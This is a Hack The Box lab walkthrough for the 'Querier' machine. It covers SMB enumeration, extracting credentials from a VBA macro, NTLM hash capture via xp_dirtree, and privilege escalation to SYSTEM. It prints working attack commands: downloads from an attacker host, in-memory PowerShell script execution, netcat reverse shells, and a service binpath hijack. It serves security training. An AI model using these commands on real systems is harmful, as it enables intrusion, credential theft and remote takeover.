---
layout: post
title: 'HTB Querier - Walkthrough'
date: 2026-03-09 03:28:36 +0000
categories: [cybersecurity]
tags:
  - writeup
description: "Room Link: https://app.hackthebox.com/machines/Querier"
canonical_url: "https://medium.com/@hemanthakrishnach/htb-querier-walkthrough-acf8c617cb68"
image: "/assets/images/posts/htb-querier-walkthrough/img-000-134092ec.png"
---

Room Link: https://app.hackthebox.com/machines/Querier

---

### HTB Querier — Walkthrough

![image](/assets/images/posts/htb-querier-walkthrough/img-000-134092ec.png)

Room Link: <https://app.hackthebox.com/machines/Querier>

### Reconnaissance

A full TCP port scan reveals the target’s attack surface:
```bash
nmap -T4 -p- -A -Pn <MACHINE_IP>
```
![image](/assets/images/posts/htb-querier-walkthrough/img-001-6ac08351.png)![image](/assets/images/posts/htb-querier-walkthrough/img-002-8e1650b6.png)

Key open ports:

- **135, 139, 445** — RPC / SMB — Windows file sharing- **1433** — MS-SQL — Microsoft SQL Server 2017 RTM- **5985, 47001** — HTTP — WinRM / HTTPAPI

### SMB Enumeration

Anonymous SMB access is available. Listing shares with no password:
```cpp
smbclient -L //<MACHINE_IP>/ -U anonymous
```
![image](/assets/images/posts/htb-querier-walkthrough/img-003-d4dbb74e.png)

A non-default share named **Reports** is visible. Connecting and listing its contents:
```bash
smbclient //<MACHINE_IP>/reports -U anonymoussmb: \> mget *
```

This downloads **Currency Volume Report.xlsm** — a macro-enabled Excel workbook.

### Extracting Credentials from the XLSM

Running `binwalk` on the file reveals it's a ZIP archive (standard Office Open XML format) containing a `xl/vbaProject.bin` — a compiled VBA macro binary
```typescript
binwalk Currency\ Volume\ Report.xlsmbinwalk -e Currency\ Volume\ Report.xlsm
```
![image](/assets/images/posts/htb-querier-walkthrough/img-004-ae23c409.png)![image](/assets/images/posts/htb-querier-walkthrough/img-005-70596b28.png)

After extraction, inspecting the VBA binary:
```bash
cd _Currency\ Volume\ Report.xlsm.extracted/xlcat vbaProject.bin
```
![image](/assets/images/posts/htb-querier-walkthrough/img-006-1a20dfaa.png)

Readable strings within the binary reveal a hardcoded connection string:![image](/assets/images/posts/htb-querier-walkthrough/img-007-a4e3648b.png)
```ini
Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

**Credentials recovered:** `reporting` / `PcwTWTHRwryjc$c6`

### MSSQL Access — Low Privilege

Authenticating to SQL Server using Impacket’s `mssqlclient.py`:
```bash
mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@<MACHINE_IP> -windows-auth
```

The connection succeeds and the database context switches to `volume`. However, attempting to enable `xp_cmdshell` fails — the `reporting` account lacks the required permissions:
```scss
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
```
![image](/assets/images/posts/htb-querier-walkthrough/img-008-44d2ad3f.png)

### NTLM Hash Capture via xp\_dirtree

Since `xp_cmdshell` is unavailable, a different technique is used to escalate: forcing the SQL Server service account to authenticate outbound to an attacker-controlled SMB server, capturing its NTLMv2 hash.

**Step 1 — Start a rogue SMB listener on the attacker machine:**
```bash
mkdir sharesmbserver.py -smb2support share share/
```
![image](/assets/images/posts/htb-querier-walkthrough/img-009-53b15162.png)

**Step 2 — Trigger an outbound SMB connection from SQL Server:**
```bash
exec xp_dirtree '\\<ATTACKER_IP>\share',1,1
```
![image](/assets/images/posts/htb-querier-walkthrough/img-010-bc07a60c.png)

The Impacket SMB server captures the incoming authentication:
```scss
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc, QUERIER)[*] User mssql-svc\QUERIER authenticated successfully[*] mssql-svc::QUERIER:4141414141414141:<NTLMv2 hash>
```
![image](/assets/images/posts/htb-querier-walkthrough/img-011-09d942cb.png)

**Step 3 — Crack the hash with Hashcat (mode 5600 = NTLMv2):**
```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```
![image](/assets/images/posts/htb-querier-walkthrough/img-012-772b969f.png)

**Password cracked:** `corporate568`

**Elevated credentials:** `mssql-svc` / `corporate568`

### MSSQL Access — High Privilege

Re-authenticating with the `mssql-svc` account:
```bash
mssqlclient.py QUERIER/mssql-svc:'corporate568'@<MACHINE_IP> -windows-auth
```
![image](/assets/images/posts/htb-querier-walkthrough/img-013-422293ac.png)

This account has `sysadmin` rights. Enabling `xp_cmdshell` now succeeds:
```typescript
enable_xp_cmdshell
```

Enumerating users on the system:
```bash
xp_cmdshell dir C:\users
```

The user flag is located at `C:\users\mssql-svc\desktop\user.txt`.![image](/assets/images/posts/htb-querier-walkthrough/img-014-ff87e410.png)

### Reverse Shell

**Step 1 — Download netcat to a writable directory on the target:**
```swift
xp_cmdshell powershell -c Invoke-WebRequest "http://<ATTACKER_IP>/nc.exe" -OutFile "C:\Reports\nc.exe"
```
![image](/assets/images/posts/htb-querier-walkthrough/img-015-fe09a452.png)

**Step 2 — Set up a listener on the attacker machine:**
```bash
nc -lvnp 4444
```

**Step 3 — Execute the reverse shell:**
```xml
xp_cmdshell C:\Reports\nc.exe <ATTACKER_IP> 4444 -e cmd.exe
```
![image](/assets/images/posts/htb-querier-walkthrough/img-016-362c3ccd.png)

A shell is returned running as `QUERIER\mssql-svc`.![image](/assets/images/posts/htb-querier-walkthrough/img-017-d22a5489.png)

### Privilege Escalation

### Method 1 — Cached GPP Credentials (PowerUp)

Fetching and running PowerUp directly in memory:
```vbnet
echo IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powerup.ps1') | powershell -noprofile -
```
![image](/assets/images/posts/htb-querier-walkthrough/img-018-00118390.png)![image](/assets/images/posts/htb-querier-walkthrough/img-019-2872c26c.png)

PowerUp identifies several attack vectors, including a **cached Group Policy Preferences (GPP) file** at:
```bash
C:\ProgramData\Microsoft\Group Policy\History\{GUID}\Machine\Preferences\Groups\Groups.xml
```

The GPP file contains the local Administrator credentials in encrypted (but trivially crackable) `cpassword` format. PowerUp automatically decrypts it, revealing:

- **Username:** Administrator- **Password:**`**********************`

Using Impacket’s `psexec.py` to get a SYSTEM shell:
```perl
psexec.py Administrator:'password'@10.129.44.207
```

```bash
C:\Windows\system32> whoamint authority\system
```
![image](/assets/images/posts/htb-querier-walkthrough/img-020-f3064c76.png)

The root flag is located at `C:\Users\Administrator\Desktop\root.txt`.

### Method 2 — Modifiable Service (UsoSvc)

PowerUp also flags the **UsoSvc** (Update Orchestrator Service) as modifiable by the current user. The service runs as `LocalSystem`, so hijacking its binary path yields a SYSTEM shell.![image](/assets/images/posts/htb-querier-walkthrough/img-021-e5703772.png)

**Step 1 — Reconfigure the service binary path to execute a reverse shell:**
```bash
sc config UsoSvc binpath="C:/reports/nc.exe <ATTACKER_IP> 5555 -e cmd.exe"
```
![image](/assets/images/posts/htb-querier-walkthrough/img-022-97e67ed1.png)

Verify the change:
```typescript
sc qc UsoSvc
```

**Step 2 — Start a listener:**
```bash
nc -lvnp 5555
```

**Step 3 — Restart the service:**
```sql
sc stop UsoSvcsc start UsoSvc
```

The listener receives a connection as `nt authority\system`.![image](/assets/images/posts/htb-querier-walkthrough/img-023-7a376b83.png)

### Key Takeaways

- **Macro-enabled Office files** stored on accessible file shares are a significant credential leak risk — always audit SMB share permissions and avoid embedding connection strings in VBA.- `xp_dirtree` can be used as a hash-coercion primitive even without `xp_cmdshell` privileges, making any authenticated MSSQL session a potential pivot point.- **NTLMv2 hashes** for service accounts are often crackable with common wordlists — service accounts should use long, random passwords and ideally be configured with SMB signing or restricted from outbound SMB.- **GPP cpassword** credentials cached on disk remain a persistent risk on older or unpatched Windows environments.- **Modifiable services running as SYSTEM** are a classic and reliable local privilege escalation vector detectable with tools like PowerUp or WinPEAS.

### Thanks for reading!
